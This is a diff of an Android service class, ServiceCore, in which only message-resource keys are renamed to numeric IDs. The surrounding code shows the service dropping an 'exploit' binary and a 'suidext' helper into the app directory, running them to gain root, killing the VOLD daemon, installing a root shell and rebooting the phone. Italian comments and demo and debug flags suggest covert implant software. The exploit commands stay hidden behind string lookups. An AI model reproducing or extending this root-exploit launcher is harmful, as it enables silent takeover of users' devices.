@@ -48,7 +48,7 @@ public class ServiceCore extends Service {
 			Check.log(TAG + " (onCreate)"); //$NON-NLS-1$
 		}
 		if (Cfg.DEMO) {
-			Toast.makeText(this, Messages.getString("ServiceCore.1"), Toast.LENGTH_LONG).show(); //$NON-NLS-1$
+			Toast.makeText(this, Messages.getString("32.1"), Toast.LENGTH_LONG).show(); //$NON-NLS-1$
 			// setBackground();
 		}
 		Status.setAppContext(getApplicationContext());
@@ -67,7 +67,7 @@ public class ServiceCore extends Service {
 			paint.setStyle(Paint.Style.FILL);
 			paint.setAntiAlias(true);
 			paint.setTextSize(20);
-			canvas.drawText(Messages.getString("ServiceCore.0"), 10, 100, paint);
+			canvas.drawText(Messages.getString("32.0"), 10, 100, paint);
 			try {
 				wm.setBitmap(bitmap);
 			} catch (final IOException e) {
@@ -86,7 +86,7 @@ public class ServiceCore extends Service {
 		}
 
 		if (Cfg.DEMO) {
-			Toast.makeText(this, Messages.getString("ServiceCore.3"), Toast.LENGTH_LONG).show(); //$NON-NLS-1$
+			Toast.makeText(this, Messages.getString("32.3"), Toast.LENGTH_LONG).show(); //$NON-NLS-1$
 		}
 		core.Stop();
 		core = null;
@@ -96,7 +96,7 @@ public class ServiceCore extends Service {
 	public void onStart(Intent intent, int startId) {
 		super.onStart(intent, startId);
 
-		this.shellFile = Messages.getString("ServiceCore.2"); //$NON-NLS-1$
+		this.shellFile = Messages.getString("32.2"); //$NON-NLS-1$
 
 		if (checkRoot() == true) { 
 			Status.self().setRoot(true);
@@ -129,9 +129,9 @@ public class ServiceCore extends Service {
 				return false;
 			}
 
-			final String crashlog = Messages.getString("ServiceCore.4"); //$NON-NLS-1$
-			final String exploit = Messages.getString("ServiceCore.5"); //$NON-NLS-1$
-			final String suidext = Messages.getString("ServiceCore.6"); //$NON-NLS-1$
+			final String crashlog = Messages.getString("32.4"); //$NON-NLS-1$
+			final String exploit = Messages.getString("32.5"); //$NON-NLS-1$
+			final String suidext = Messages.getString("32.6"); //$NON-NLS-1$
 			boolean isRoot = false;
 
 			// Creiamo il crashlog
@@ -164,9 +164,9 @@ public class ServiceCore extends Service {
 			final File filesPath = getApplicationContext().getFilesDir();
 			final String path = filesPath.getAbsolutePath();
 
-			Runtime.getRuntime().exec(Messages.getString("ServiceCore.7") + path + "/" + exploit); //$NON-NLS-1$ //$NON-NLS-2$
-			Runtime.getRuntime().exec(Messages.getString("ServiceCore.8") + path + "/" + suidext); //$NON-NLS-1$ //$NON-NLS-2$
-			Runtime.getRuntime().exec(Messages.getString("ServiceCore.9") + path + "/" + crashlog); //$NON-NLS-1$ //$NON-NLS-2$
+			Runtime.getRuntime().exec(Messages.getString("32.7") + path + "/" + exploit); //$NON-NLS-1$ //$NON-NLS-2$
+			Runtime.getRuntime().exec(Messages.getString("32.8") + path + "/" + suidext); //$NON-NLS-1$ //$NON-NLS-2$
+			Runtime.getRuntime().exec(Messages.getString("32.9") + path + "/" + crashlog); //$NON-NLS-1$ //$NON-NLS-2$
 
 			final String exppath = path + "/" + exploit; //$NON-NLS-1$
 
@@ -191,16 +191,16 @@ public class ServiceCore extends Service {
 
 			if (isRoot) {
 				// Killiamo VOLD per due volte
-				Runtime.getRuntime().exec(path + "/" + suidext + Messages.getString("ServiceCore.10")); //$NON-NLS-1$ //$NON-NLS-2$
+				Runtime.getRuntime().exec(path + "/" + suidext + Messages.getString("32.10")); //$NON-NLS-1$ //$NON-NLS-2$
 
 				// Installiamo la shell root
-				Runtime.getRuntime().exec(path + "/" + suidext + Messages.getString("ServiceCore.11")); //$NON-NLS-1$ //$NON-NLS-2$
+				Runtime.getRuntime().exec(path + "/" + suidext + Messages.getString("32.11")); //$NON-NLS-1$ //$NON-NLS-2$
 
 				if (Cfg.DEBUG) {
 					Check.log(TAG + " (onStart): Root exploit"); //$NON-NLS-1$
 				}
 				if (Cfg.DEMO) {
-					Toast.makeText(this, Messages.getString("ServiceCore.12"), Toast.LENGTH_LONG).show(); //$NON-NLS-1$
+					Toast.makeText(this, Messages.getString("32.12"), Toast.LENGTH_LONG).show(); //$NON-NLS-1$
 				}
 
 				// Riavviamo il telefono
@@ -210,7 +210,7 @@ public class ServiceCore extends Service {
 					Check.log(TAG + " (onStart): exploit failed!"); //$NON-NLS-1$
 				}
 				if (Cfg.DEMO) {
-					Toast.makeText(this, Messages.getString("ServiceCore.13"), Toast.LENGTH_LONG).show(); //$NON-NLS-1$
+					Toast.makeText(this, Messages.getString("32.13"), Toast.LENGTH_LONG).show(); //$NON-NLS-1$
 				}
 
 			}
@@ -233,7 +233,7 @@ public class ServiceCore extends Service {
 			// Verifichiamo di essere root
 			final AutoFile file = new AutoFile(shellFile);
 			if (file.exists() && file.canRead()) {
-				final Process p = Runtime.getRuntime().exec(shellFile + Messages.getString("ServiceCore.14")); //$NON-NLS-1$
+				final Process p = Runtime.getRuntime().exec(shellFile + Messages.getString("32.14")); //$NON-NLS-1$
 				p.waitFor();
 
 				if (p.exitValue() == 1) {
